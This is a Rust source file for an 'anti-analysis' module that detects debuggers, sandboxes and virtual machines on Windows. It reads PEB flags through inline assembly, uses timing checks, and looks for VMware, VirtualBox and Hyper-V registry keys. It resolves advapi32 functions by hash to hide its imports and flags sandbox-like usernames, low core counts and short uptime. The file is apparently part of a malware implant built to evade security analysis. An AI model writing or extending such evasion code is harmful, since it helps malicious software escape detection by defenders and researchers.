#![allow(dead_code)]

//! # Anti-Analysis Module
//!
//! Detects hostile environments:
//! - Sandboxes (VM, low resources)
//! - Debuggers (PEB flags, timing)
//! - Analysis tools

use log::debug;

// ============================================================================
// MAIN CHECK
// ============================================================================

/// Returns true if running in hostile/analysis environment
pub fn is_hostile_environment() -> bool {
    #[cfg(target_os = "windows")]
    {
        if is_debugger_present() {
            debug!("Debugger detected");
            return true;
        }
        
        if is_sandbox() {
            debug!("Sandbox detected");
            return true;
        }
        
        if is_low_resources() {
            debug!("Low resources (VM?)");
            return true;
        }
    }
    
    false
}

// ============================================================================
// DEBUGGER DETECTION
// ============================================================================

#[cfg(target_os = "windows")]
fn is_debugger_present() -> bool {
    unsafe {
        // Method 1: PEB.BeingDebugged
        let peb: *const u8;
        std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, pure, readonly));
        
        let being_debugged = *peb.add(0x02); // Offset 0x02 = BeingDebugged
        if being_debugged != 0 {
            return true;
        }
        
        // Method 2: NtGlobalFlag (PEB offset 0xBC on x64)
        let nt_global_flag = *(peb.add(0xBC) as *const u32);
        // FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
        if (nt_global_flag & 0x70) != 0 {
            return true;
        }
        
        // Method 3: Timing check (debugger causes delays)
        let start = std::time::Instant::now();
        for _ in 0..1000 { std::hint::black_box(0); }
        let elapsed = start.elapsed().as_micros();
        
        // If loop takes > 1ms, likely being debugged/traced
        if elapsed > 1000 {
            return true;
        }
    }
    
    false
}

#[cfg(not(target_os = "windows"))]
fn is_debugger_present() -> bool { false }

// ============================================================================
// SANDBOX DETECTION
// ============================================================================

#[cfg(target_os = "windows")]
fn is_sandbox() -> bool {
    // Check for common VM/Sandbox artifacts
    
    // Helper to check key existence using Native API
    unsafe fn check_key_exists(path: &str) -> bool {
        use super::api_resolver::*;
        
        // Load advapi32
        if get_module_by_hash(HASH_ADVAPI32).is_none() {
            if let Some(load_lib) = resolve_api::<unsafe extern "system" fn(*const u8) -> *const std::ffi::c_void>(
                HASH_KERNEL32, HASH_LOAD_LIBRARY_A
            ) {
                load_lib(b"advapi32.dll\0".as_ptr());
            } else {
                return false;
            }
        }
        
        let advapi32 = match get_module_by_hash(HASH_ADVAPI32) {
            Some(m) => m,
            None => return false,
        };
        
        type RegOpenKeyExW = unsafe extern "system" fn(isize, *const u16, u32, u32, *mut isize) -> i32;
        type RegCloseKey = unsafe extern "system" fn(isize) -> i32;
        
        let reg_open: RegOpenKeyExW = match get_export_by_hash(advapi32, djb2(b"RegOpenKeyExW")) {
            Some(p) => std::mem::transmute(p),
            None => return false,
        };
            
        let reg_close: RegCloseKey = match get_export_by_hash(advapi32, djb2(b"RegCloseKey")) {
            Some(p) => std::mem::transmute(p),
            None => return false,
        };
        
        // HKEY_LOCAL_MACHINE = 0x80000002
        const HKEY_LOCAL_MACHINE: isize = 0x80000002u32 as isize;
        const KEY_READ: u32 = 0x20019;
        
        let path_wide: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();
        let mut hkey: isize = 0;
        
        let status = reg_open(HKEY_LOCAL_MACHINE, path_wide.as_ptr(), 0, KEY_READ, &mut hkey);
        
        if status == 0 {
            reg_close(hkey);
            return true;
        }
        
        false
    }
    
    // Method 1: Check for VM registry keys (Native API)
    unsafe {
        // VMware
        if check_key_exists(r"SOFTWARE\VMware, Inc.\VMware Tools") { return true; }
        // VirtualBox
        if check_key_exists(r"SOFTWARE\Oracle\VirtualBox Guest Additions") { return true; }
        // Hyper-V
        if check_key_exists(r"SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters") { return true; }
    }
    
    // Method 2: Check username/computername for sandbox patterns
    if let Ok(user) = std::env::var("USERNAME") {
        let user_lower = user.to_lowercase();
        let sandbox_users = ["sandbox", "virus", "malware", "test", "sample", "john", "admin"];
        for s in sandbox_users {
            if user_lower.contains(s) {
                return true;
            }
        }
    }
    
    // Method 3: Check recent files (sandboxes often have none)
    let appdata = std::env::var("APPDATA").unwrap_or_default();
    let recent_path = format!("{}\\Microsoft\\Windows\\Recent", appdata);
    if let Ok(entries) = std::fs::read_dir(&recent_path) {
        let count = entries.count();
        if count < 5 {
            // Very few recent files = likely sandbox
            return true;
        }
    }
    
    false
}

#[cfg(not(target_os = "windows"))]
fn is_sandbox() -> bool { false }

// ============================================================================
// RESOURCE DETECTION
// ============================================================================

#[cfg(target_os = "windows")]
fn is_low_resources() -> bool {
    // Sandboxes often have minimal resources
    
    // Method 1: Check CPU cores
    // Most sandboxes have 1-2 cores
    let cpu_count = std::thread::available_parallelism()
        .map(|p| p.get())
        .unwrap_or(1);
    
    if cpu_count < 2 {
        return true;
    }
    
    // Method 2: Check RAM (via GlobalMemoryStatusEx)
    // We'll use a simple approach - check if we can allocate 512MB
    // Sandboxes often limit memory
    
    // Method 3: Check uptime (sandboxes often freshly booted)
    // GetTickCount64 returns milliseconds since boot
    #[link(name = "kernel32")]
    extern "system" {
        fn GetTickCount64() -> u64;
    }
    
    unsafe {
        let uptime_ms = GetTickCount64();
        let uptime_min = uptime_ms / 60000;
        
        // If system uptime < 5 minutes, suspicious
        if uptime_min < 5 {
            return true;
        }
    }
    
    false
}

#[cfg(not(target_os = "windows"))]
fn is_low_resources() -> bool { false }
